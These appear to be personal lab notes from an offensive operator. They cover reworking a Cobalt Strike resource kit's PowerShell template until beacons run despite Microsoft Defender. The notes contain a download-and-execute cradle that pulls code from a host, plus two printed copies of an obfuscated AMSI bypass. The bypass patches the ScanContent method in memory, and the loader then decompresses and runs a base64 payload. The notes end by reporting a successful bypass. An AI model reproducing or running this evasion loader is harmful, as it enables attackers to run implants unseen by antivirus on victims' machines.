  loading new `arsenal kit`
![[Pasted image 20250327213617.png]]
started `listener` to test `resource kit`
```powershell
iex(iwr http://192.168.127.129/a -useb)
```
issue with `compress.ps1` i think
![[Pasted image 20250327213934.png]]
forgot to change `$s` to `$thegreatest`

![[Pasted image 20250327214231.png]]
getting caught by defender with my resource kit, need to fix this
![[Pasted image 20250327221145.png]]
able to get  beacon with defender off need to test `compress.ps1`
![[Pasted image 20250327221506.png]]
things to try in [[7. compress.ps1 - resource kit - OPTEV-RT Modification]]
#### 4.10  working `compress.ps1`
`e4f60766bc71fefacc039f45c7f60a3eba5b3d4a00fdd241b5626c908aee9747  compress.ps1`
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

#### 4.11 `compress.ps1` with issues
`2e0eb7ab65afb6e214aae645c5d0514bb04580f1aa4cf3d69ea2adabae70dfe1  compress.ps1`
```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$thegreatest=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($thegreatest,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
going to copy the old working to the `4.11` and see what happens
![[Pasted image 20250331145131.png]]
copied old working one, rebuilding the `arsenal_kit`
![[Pasted image 20250331160130.png]]
![[Pasted image 20250331160141.png]]
unloading old `arsenal_kit.cna`
![[Pasted image 20250331160402.png]]
restarting the teams server and reloading the new `arsenal_kit.cna`
![[Pasted image 20250331160540.png]]
was able to bypass




